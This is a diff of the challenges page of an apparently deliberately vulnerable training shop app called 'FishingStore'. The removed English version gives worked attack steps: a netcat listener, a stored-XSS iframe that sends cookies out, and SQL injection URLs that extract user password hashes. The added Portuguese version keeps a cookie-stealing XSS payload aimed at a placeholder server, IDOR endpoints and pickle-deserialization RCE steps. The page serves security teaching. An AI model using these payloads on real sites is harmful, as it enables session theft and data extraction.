@@ -3,158 +3,355 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Challenges - FishingStore</title>
+    <title>FishingStore - Security Challenges</title>
     <link rel="stylesheet" href="/css/style.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        .accordion {
+            margin-top: 2rem;
+        }
+        
+        .accordion-item {
+            background: #fff;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            margin-bottom: 1rem;
+            overflow: hidden;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+        }
+        
+        .accordion-header {
+            background: #f8f9fa;
+            padding: 0;
+            margin: 0;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        
+        .accordion-header:hover {
+            background: #e9ecef;
+        }
+        
+        .accordion-button {
+            width: 100%;
+            padding: 1rem;
+            border: none;
+            background: none;
+            text-align: left;
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: #333;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            cursor: pointer;
+        }
+        
+        .accordion-button:after {
+            content: '\f078';
+            font-family: 'Font Awesome 6 Free';
+            font-weight: 900;
+            transition: transform 0.3s ease;
+        }
+        
+        .accordion-button[aria-expanded="true"]:after {
+            transform: rotate(180deg);
+        }
+        
+        .accordion-content {
+            padding: 0;
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.3s ease-out;
+        }
+        
+        .accordion-content.active {
+            max-height: 1000px;
+            transition: max-height 0.5s ease-in;
+        }
+        
+        .accordion-body {
+            padding: 1rem;
+            border-top: 1px solid #e0e0e0;
+        }
+        
+        .challenge-badge {
+            display: inline-block;
+            padding: 0.25rem 0.5rem;
+            border-radius: 4px;
+            font-size: 0.875rem;
+            font-weight: 600;
+            margin-left: 1rem;
+        }
+        
+        .difficulty-easy {
+            background-color: #d4edda;
+            color: #155724;
+        }
+        
+        .difficulty-medium {
+            background-color: #fff3cd;
+            color: #856404;
+        }
+        
+        .difficulty-hard {
+            background-color: #f8d7da;
+            color: #721c24;
+        }
+
+        .code-block {
+            background: #f8f9fa;
+            border: 1px solid #e0e0e0;
+            border-radius: 4px;
+            padding: 1rem;
+            margin: 1rem 0;
+            font-family: monospace;
+            white-space: pre-wrap;
+        }
+
+        .steps-list {
+            padding-left: 1.2rem;
+        }
+
+        .steps-list li {
+            margin-bottom: 0.5rem;
+        }
+
+        .challenge-icon {
+            margin-right: 0.5rem;
+            width: 24px;
+            text-align: center;
+        }
+    </style>
 </head>
-<body>
+<body class="bg-light">
     <nav class="navbar">
         <div class="nav-container">
             <a href="/" class="nav-brand">FishingStore</a>
+            <div class="search-bar">
+                <input type="text" id="searchInput" placeholder="Search for fishing gear...">
+                <button id="searchButton"><i class="fas fa-search"></i></button>
+            </div>
             <div class="nav-menu">
-                <div class="auth-only">
-                    <a href="/home.html" class="nav-link">Home</a>
-                    <a href="/challenge.html" class="nav-link active">
-                        <i class="fas fa-flag"></i>
-                    </a>
-                    <button id="logoutButton">Logout</button>
+                <a href="/cart.html" class="cart-icon" id="cartIcon">
+                    <i class="fas fa-shopping-cart"></i>
+                    <span class="cart-count">0</span>
+                </a>
+                <a href="/challenge.html" class="cart-icon">
+                    <i class="fas fa-flag"></i>
+                </a>
+                <div class="user-menu">
+                    <button class="user-menu-btn" id="userMenuBtn">
+                        <i class="fas fa-user"></i>
+                        <span>Account</span>
+                        <i class="fas fa-chevron-down"></i>
+                    </button>
+                    <div class="user-menu-content" id="userMenuContent">
+                        <a href="/profile.html" class="user-menu-item">
+                            <i class="fas fa-user-circle"></i>My Address
+                        </a>
+                        <a href="/orders.html" class="user-menu-item">
+                            <i class="fas fa-box"></i>Orders
+                        </a>
+                        <a href="/change-password.html" class="user-menu-item">
+                            <i class="fas fa-key"></i>Change Password
+                        </a>
+                        <hr style="margin: 8px 0; border: none; border-top: 1px solid #eee;">
+                        <a href="#" class="user-menu-item" id="logoutButton">
+                            <i class="fas fa-sign-out-alt"></i>Logout
+                        </a>
+                    </div>
                 </div>
             </div>
         </div>
     </nav>
 
-    <div class="container">
-        <h1>Security Learning Challenges</h1>
+    <div class="container mt-5 challenge-page">
         <div class="alert alert-warning">
-            <h3>⚠️ WARNING: This application contains intentional vulnerabilities for educational purposes. DO NOT use these techniques on real websites! ⚠️</h3>
+            <h4 class="alert-heading">⚠️ Aviso de Segurança</h4>
+            <p class="mb-0">Esta aplicação foi desenvolvida intencionalmente com vulnerabilidades para fins educacionais. 
+            NÃO use em produção ou exponha publicamente.</p>
         </div>
 
-        <div class="challenge-section">
-            <h2>Challenge 1: Stored XSS</h2>
-            <button class="hint-btn" onclick="toggleHint('hint1')">Show Hint</button>
-            <div id="hint1" class="hint" style="display: none;">
-                <p>The product comments feature doesn't properly sanitize user input.</p>
-            </div>
-            <div class="goal">
-                <h3>Goal: Steal another user's authentication token using the product comments feature.</h3>
-            </div>
-            <button class="solution-btn" onclick="toggleSolution('solution1')">View Solution</button>
-            <div id="solution1" class="solution" style="display: none;">
-                <h4>Solution:</h4>
-                <ol>
-                    <li>Set up a listener:
-                        <pre><code>nc -lvp 12345</code></pre>
-                    </li>
-                    <li>Add this comment to any product:
-                        <pre><code>&lt;iframe src="javascript:fetch('http://localhost:12345/?c='+document.cookie)"&gt;</code></pre>
-                    </li>
-                    <li>When other users view the product, their token will be sent to your listener</li>
-                    <li>Use the stolen token:
-                        <pre><code>curl -H "Authorization: Bearer STOLEN_TOKEN" http://localhost:8000/comments/</code></pre>
-                    </li>
-                </ol>
-            </div>
-        </div>
+        <h2 class="mb-4">Desafios de Segurança</h2>
+        <p class="lead mb-4">Explore as vulnerabilidades intencionalmente implementadas nesta aplicação:</p>
 
-        <div class="challenge-section">
-            <h2>Challenge 2: SQL Injection</h2>
-            <button class="hint-btn" onclick="toggleHint('hint2')">Show Hint</button>
-            <div id="hint2" class="hint" style="display: none;">
-                <p>The product search feature doesn't properly escape user input in SQL queries.</p>
-            </div>
-            <div class="goal">
-                <h3>Goal: Extract database schema information using SQL injection in the product search.</h3>
-            </div>
-            <button class="solution-btn" onclick="toggleSolution('solution2')">View Solution</button>
-            <div id="solution2" class="solution" style="display: none;">
-                <h4>Solution:</h4>
-                <ol>
-                    <li>First, verify the search works normally:
-                        <pre><code>http://localhost:8000/products/search?q=rod</code></pre>
-                    </li>
-                    <li>Find number of columns using ORDER BY:
-                        <pre><code>http://localhost:8000/products/search?q=rod' ORDER BY 5--</code></pre>
-                    </li>
-                    <li>Map column positions using UNION SELECT:
-                        <pre><code>http://localhost:8000/products/search?q=x' UNION SELECT 'a', 'b', 'c', 'd', 'e'--</code></pre>
-                    </li>
-                    <li>List all tables in the database:
-                        <pre><code>http://localhost:8000/products/search?q=x' UNION SELECT name, name, name, 0, name FROM sqlite_master WHERE type='table'--</code></pre>
-                    </li>
-                    <li>Show table structures (columns):
-                        <pre><code>http://localhost:8000/products/search?q=x' UNION SELECT name, sql, sql, 0, sql FROM sqlite_master WHERE type='table'--</code></pre>
-                    </li>
-                    <li>Extract user credentials:
-                        <pre><code>http://localhost:8000/products/search?q=x' UNION SELECT id, username, hashed_password, id, username FROM users--</code></pre>
-                    </li>
-                </ol>
-            </div>
-        </div>
+        <div class="accordion">
+            <!-- SQL Injection Challenge -->
+            <div class="accordion-item">
+                <h3 class="accordion-header">
+                    <button class="accordion-button" aria-expanded="false">
+                        <i class="fas fa-database challenge-icon"></i>
+                        SQL Injection na Busca
+                        <span class="challenge-badge difficulty-easy">Fácil</span>
+                    </button>
+                </h3>
+                <div class="accordion-content">
+                    <div class="accordion-body">
+                        <h4>Objetivo</h4>
+                        <p>Explorar a vulnerabilidade de SQL Injection no endpoint de busca para extrair informações sensíveis.</p>
 
-        <div class="challenge-section">
-            <h2>Challenge 3: IDOR (Insecure Direct Object Reference)</h2>
-            <button class="hint-btn" onclick="toggleHint('hint3')">Show Hint</button>
-            <div id="hint3" class="hint" style="display: none;">
-                <p>The profile page uses user IDs in the API endpoints for addresses. Try changing the user ID in the requests.</p>
-            </div>
-            <div class="goal">
-                <h3>Goal: Access and modify other users' addresses by manipulating the user ID in API requests.</h3>
-            </div>
-            <button class="solution-btn" onclick="toggleSolution('solution3')">View Solution</button>
-            <div id="solution3" class="solution" style="display: none;">
-                <h4>Solution:</h4>
-                <ol>
-                    <li>First, get your own user ID by checking the network requests when loading your profile:
-                        <pre><code>GET /api/user/1/address</code></pre>
-                    </li>
-                    <li>Try accessing another user's address by changing the ID:
-                        <pre><code>GET /api/user/2/address</code></pre>
-                    </li>
-                    <li>Update another user's address using your token but their ID:
-                        <pre><code>PUT /api/user/2/address
-Content-Type: application/json
-Authorization: Bearer YOUR_TOKEN
+                        <h4>Passos</h4>
+                        <ol class="steps-list">
+                            <li>Use ORDER BY para descobrir o número de colunas</li>
+                            <li>Use UNION SELECT para mapear as colunas</li>
+                            <li>Extraia informações da tabela sqlite_master</li>
+                            <li>Extraia credenciais de usuários</li>
+                        </ol>
 
-{
-    "street": "Hacked Street",
-    "city": "Hacked City",
-    "state": "HS",
-    "zip_code": "12345",
-    "country": "Hackerland"
-}</code></pre>
-                    </li>
-                </ol>
+                        <h4>Exemplo de Payload</h4>
+                        <div class="code-block">' UNION SELECT 1,2,3,4,5--</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- XSS Challenge -->
+            <div class="accordion-item">
+                <h3 class="accordion-header">
+                    <button class="accordion-button" aria-expanded="false">
+                        <i class="fas fa-code challenge-icon"></i>
+                        XSS nos Comentários
+                        <span class="challenge-badge difficulty-medium">Médio</span>
+                    </button>
+                </h3>
+                <div class="accordion-content">
+                    <div class="accordion-body">
+                        <h4>Objetivo</h4>
+                        <p>Explorar XSS armazenado nos comentários para roubar cookies de outros usuários.</p>
+
+                        <h4>Passos</h4>
+                        <ol class="steps-list">
+                            <li>Crie um comentário com payload XSS</li>
+                            <li>Use um iframe para contornar restrições</li>
+                            <li>Capture cookies em seu servidor</li>
+                        </ol>
+
+                        <h4>Exemplo de Payload</h4>
+                        <div class="code-block">&lt;iframe src="javascript:fetch('http://seu-servidor/'+document.cookie)"&gt;&lt;/iframe&gt;</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- IDOR Challenge -->
+            <div class="accordion-item">
+                <h3 class="accordion-header">
+                    <button class="accordion-button" aria-expanded="false">
+                        <i class="fas fa-user-secret challenge-icon"></i>
+                        IDOR nos Endereços
+                        <span class="challenge-badge difficulty-medium">Médio</span>
+                    </button>
+                </h3>
+                <div class="accordion-content">
+                    <div class="accordion-body">
+                        <h4>Objetivo</h4>
+                        <p>Explorar IDOR para acessar e modificar endereços de outros usuários.</p>
+
+                        <h4>Passos</h4>
+                        <ol class="steps-list">
+                            <li>Identifique seu ID de usuário</li>
+                            <li>Modifique o ID na requisição</li>
+                            <li>Acesse/modifique dados de outros usuários</li>
+                        </ol>
+
+                        <h4>Endpoints Vulneráveis</h4>
+                        <div class="code-block">GET /api/user/{user_id}/address
+PUT /api/user/{user_id}/address</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- RCE Challenge -->
+            <div class="accordion-item">
+                <h3 class="accordion-header">
+                    <button class="accordion-button" aria-expanded="false">
+                        <i class="fas fa-terminal challenge-icon"></i>
+                        RCE via Pickle no Backup do Carrinho
+                        <span class="challenge-badge difficulty-hard">Difícil</span>
+                    </button>
+                </h3>
+                <div class="accordion-content">
+                    <div class="accordion-body">
+                        <h4>Objetivo</h4>
+                        <p>Explorar a vulnerabilidade de desserialização insegura no backup do carrinho para executar código arbitrário.</p>
+
+                        <h4>Passos</h4>
+                        <ol class="steps-list">
+                            <li>Crie uma classe maliciosa que implementa __reduce__</li>
+                            <li>Serialize a classe com pickle</li>
+                            <li>Codifique em base64</li>
+                            <li>Envie para o endpoint de importação</li>
+                        </ol>
+
+                        <h4>Endpoints Vulneráveis</h4>
+                        <div class="code-block">GET /api/cart/export
+POST /api/cart/import</div>
+
+                        <h4>Script de Exploit</h4>
+                        <p>Use o script <code>exploit.py</code> fornecido para testar diferentes payloads:</p>
+                        <div class="code-block">python3 exploit.py
+1. Exportar carrinho atual
+2. Importar carrinho malicioso (com RCE)
+3. Testar RCE básico (whoami)</div>
+                    </div>
+                </div>
             </div>
         </div>
     </div>
 
+    <script src="/js/auth.js"></script>
     <script>
-        function toggleHint(id) {
-            const hint = document.getElementById(id);
-            hint.style.display = hint.style.display === 'none' ? 'block' : 'none';
-        }
+        // Verifica autenticação
+        checkAuth();
 
-        function toggleSolution(id) {
-            const solution = document.getElementById(id);
-            solution.style.display = solution.style.display === 'none' ? 'block' : 'none';
-        }
+        // Accordion functionality
+        document.querySelectorAll('.accordion-button').forEach(button => {
+            button.addEventListener('click', () => {
+                const content = button.parentElement.nextElementSibling;
+                const isExpanded = button.getAttribute('aria-expanded') === 'true';
+                
+                // Close all other accordion items
+                document.querySelectorAll('.accordion-content').forEach(item => {
+                    if (item !== content) {
+                        item.classList.remove('active');
+                        item.previousElementSibling.querySelector('.accordion-button').setAttribute('aria-expanded', 'false');
+                    }
+                });
+                
+                // Toggle current accordion item
+                button.setAttribute('aria-expanded', !isExpanded);
+                content.classList.toggle('active');
+            });
+        });
 
-        // Check authentication from cookies
-        function getCookie(name) {
-            const cookies = document.cookie.split(';');
-            for (let cookie of cookies) {
-                const [cookieName, value] = cookie.trim().split('=');
-                if (cookieName === name) {
-                    return value;
-                }
+        // User menu toggle
+        const userMenuBtn = document.getElementById('userMenuBtn');
+        const userMenuContent = document.getElementById('userMenuContent');
+
+        userMenuBtn.addEventListener('click', () => {
+            userMenuContent.classList.toggle('show');
+        });
+
+        document.addEventListener('click', (e) => {
+            if (!userMenuBtn.contains(e.target) && !userMenuContent.contains(e.target)) {
+                userMenuContent.classList.remove('show');
             }
-            return null;
+        });
+
+        // Load cart count
+        async function loadCartCount() {
+            try {
+                const response = await fetch('/api/cart/count');
+                if (!response.ok) throw new Error('Failed to fetch cart count');
+                
+                const result = await response.json();
+                document.querySelector('.cart-count').textContent = result.count;
+            } catch (error) {
+                console.error('Error loading cart count:', error);
+            }
         }
 
-        const token = getCookie('token');
-        if (!token) {
-            window.location.href = '/login.html';
-        }
+        // Initialize
+        loadCartCount();
     </script>
 </body>
 </html> 
